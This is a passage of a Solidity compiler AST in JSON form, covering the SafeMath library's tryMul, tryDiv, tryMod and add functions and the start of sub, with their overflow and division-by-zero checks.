																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "/",
														"rightExpression": {
															"argumentTypes": null,
															"id": 472,
															"name": "a",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 448,
															"src": "1785:1:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "1781:5:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"id": 474,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 450,
														"src": "1790:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1781:10:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 480,
												"nodeType": "IfStatement",
												"src": "1777:33:1",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"components": [
															{
																"argumentTypes": null,
																"hexValue": "66616c7365",
																"id": 476,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1801:5:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 477,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1808:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"id": 478,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "1800:10:1",
														"typeDescriptions": {
															"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
															"typeString": "tuple(bool,int_const 0)"
														}
													},
													"functionReturnParameters": 456,
													"id": 479,
													"nodeType": "Return",
													"src": "1793:17:1"
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"components": [
														{
															"argumentTypes": null,
															"hexValue": "74727565",
															"id": 481,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "bool",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1828:4:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"value": "true"
														},
														{
															"argumentTypes": null,
															"id": 482,
															"name": "c",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 466,
															"src": "1834:1:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"id": 483,
													"isConstant": false,
													"isInlineArray": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "TupleExpression",
													"src": "1827:9:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
														"typeString": "tuple(bool,uint256)"
													}
												},
												"functionReturnParameters": 456,
												"id": 484,
												"nodeType": "Return",
												"src": "1820:16:1"
											}
										]
									},
									"documentation": {
										"id": 446,
										"nodeType": "StructuredDocumentation",
										"src": "1266:137:1",
										"text": "@dev Returns the multiplication of two unsigned integers, with an overflow flag.\n     * _Available since v3.4._"
									},
									"id": 486,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "tryMul",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 451,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 448,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 486,
												"src": "1424:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 447,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1424:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 450,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 486,
												"src": "1435:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 449,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1435:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1423:22:1"
									},
									"returnParameters": {
										"id": 456,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 453,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 486,
												"src": "1469:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 452,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1469:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 455,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 486,
												"src": "1475:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 454,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1475:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1468:15:1"
									},
									"scope": 739,
									"src": "1408:435:1",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 512,
										"nodeType": "Block",
										"src": "2068:76:1",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 500,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 498,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 491,
														"src": "2082:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 499,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "2087:1:1",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "2082:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 505,
												"nodeType": "IfStatement",
												"src": "2078:29:1",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"components": [
															{
																"argumentTypes": null,
																"hexValue": "66616c7365",
																"id": 501,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2098:5:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 502,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2105:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"id": 503,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "2097:10:1",
														"typeDescriptions": {
															"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
															"typeString": "tuple(bool,int_const 0)"
														}
													},
													"functionReturnParameters": 497,
													"id": 504,
													"nodeType": "Return",
													"src": "2090:17:1"
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"components": [
														{
															"argumentTypes": null,
															"hexValue": "74727565",
															"id": 506,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "bool",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2125:4:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"value": "true"
														},
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 509,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 507,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 489,
																"src": "2131:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "/",
															"rightExpression": {
																"argumentTypes": null,
																"id": 508,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 491,
																"src": "2135:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "2131:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"id": 510,
													"isConstant": false,
													"isInlineArray": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "TupleExpression",
													"src": "2124:13:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
														"typeString": "tuple(bool,uint256)"
													}
												},
												"functionReturnParameters": 497,
												"id": 511,
												"nodeType": "Return",
												"src": "2117:20:1"
											}
										]
									},
									"documentation": {
										"id": 487,
										"nodeType": "StructuredDocumentation",
										"src": "1849:138:1",
										"text": "@dev Returns the division of two unsigned integers, with a division by zero flag.\n     * _Available since v3.4._"
									},
									"id": 513,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "tryDiv",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 492,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 489,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 513,
												"src": "2008:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 488,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2008:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 491,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 513,
												"src": "2019:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 490,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2019:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2007:22:1"
									},
									"returnParameters": {
										"id": 497,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 494,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 513,
												"src": "2053:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 493,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2053:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 496,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 513,
												"src": "2059:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 495,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2059:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2052:15:1"
									},
									"scope": 739,
									"src": "1992:152:1",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 539,
										"nodeType": "Block",
										"src": "2379:76:1",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 527,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 525,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 518,
														"src": "2393:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 526,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "2398:1:1",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "2393:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 532,
												"nodeType": "IfStatement",
												"src": "2389:29:1",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"components": [
															{
																"argumentTypes": null,
																"hexValue": "66616c7365",
																"id": 528,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2409:5:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 529,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2416:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"id": 530,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "2408:10:1",
														"typeDescriptions": {
															"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
															"typeString": "tuple(bool,int_const 0)"
														}
													},
													"functionReturnParameters": 524,
													"id": 531,
													"nodeType": "Return",
													"src": "2401:17:1"
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"components": [
														{
															"argumentTypes": null,
															"hexValue": "74727565",
															"id": 533,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "bool",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2436:4:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"value": "true"
														},
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 536,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 534,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 516,
																"src": "2442:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "%",
															"rightExpression": {
																"argumentTypes": null,
																"id": 535,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 518,
																"src": "2446:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "2442:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"id": 537,
													"isConstant": false,
													"isInlineArray": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "TupleExpression",
													"src": "2435:13:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
														"typeString": "tuple(bool,uint256)"
													}
												},
												"functionReturnParameters": 524,
												"id": 538,
												"nodeType": "Return",
												"src": "2428:20:1"
											}
										]
									},
									"documentation": {
										"id": 514,
										"nodeType": "StructuredDocumentation",
										"src": "2150:148:1",
										"text": "@dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\n     * _Available since v3.4._"
									},
									"id": 540,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "tryMod",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 519,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 516,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 540,
												"src": "2319:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 515,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2319:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 518,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 540,
												"src": "2330:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 517,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2330:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2318:22:1"
									},
									"returnParameters": {
										"id": 524,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 521,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 540,
												"src": "2364:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 520,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2364:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 523,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 540,
												"src": "2370:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 522,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2370:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2363:15:1"
									},
									"scope": 739,
									"src": "2303:152:1",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 565,
										"nodeType": "Block",
										"src": "2757:108:1",
										"statements": [
											{
												"assignments": [
													551
												],
												"declarations": [
													{
														"constant": false,
														"id": 551,
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 565,
														"src": "2767:9:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 550,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "2767:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 555,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 554,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 552,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 543,
														"src": "2779:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"id": 553,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 545,
														"src": "2783:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2779:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2767:17:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 559,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 557,
																"name": "c",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 551,
																"src": "2802:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 558,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 543,
																"src": "2807:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "2802:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206164646974696f6e206f766572666c6f77",
															"id": 560,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2810:29:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_30cc447bcc13b3e22b45cef0dd9b0b514842d836dd9b6eb384e20dedfb47723a",
																"typeString": "literal_string \"SafeMath: addition overflow\""
															},
															"value": "SafeMath: addition overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_30cc447bcc13b3e22b45cef0dd9b0b514842d836dd9b6eb384e20dedfb47723a",
																"typeString": "literal_string \"SafeMath: addition overflow\""
															}
														],
														"id": 556,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "2794:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 561,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2794:46:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 562,
												"nodeType": "ExpressionStatement",
												"src": "2794:46:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 563,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 551,
													"src": "2857:1:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 549,
												"id": 564,
												"nodeType": "Return",
												"src": "2850:8:1"
											}
										]
									},
									"documentation": {
										"id": 541,
										"nodeType": "StructuredDocumentation",
										"src": "2461:224:1",
										"text": "@dev Returns the addition of two unsigned integers, reverting on\noverflow.\n     * Counterpart to Solidity's `+` operator.\n     * Requirements:\n     * - Addition cannot overflow."
									},
									"id": 566,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "add",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 546,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 543,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 566,
												"src": "2703:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 542,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2703:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 545,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 566,
												"src": "2714:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 544,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2714:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2702:22:1"
									},
									"returnParameters": {
										"id": 549,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 548,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 566,
												"src": "2748:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 547,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2748:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2747:9:1"
									},
									"scope": 739,
									"src": "2690:175:1",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 587,
										"nodeType": "Block",
										"src": "3203:88:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 579,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 577,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 571,
																"src": "3221:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 578,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 569,
																"src": "3226:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "3221:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a207375627472616374696f6e206f766572666c6f77",
															"id": 580,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3229:32:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_50b058e9b5320e58880d88223c9801cd9eecdcf90323d5c2318bc1b6b916e862",
																"typeString": "literal_string \"SafeMath: subtraction overflow\""
															},
															"value": "SafeMath: subtraction overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_50b058e9b5320e58880d88223c9801cd9eecdcf90323d5c2318bc1b6b916e862",
																"typeString": "literal_string \"SafeMath: subtraction overflow\""
															}
														],
														"id": 576,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "3213:7:1",
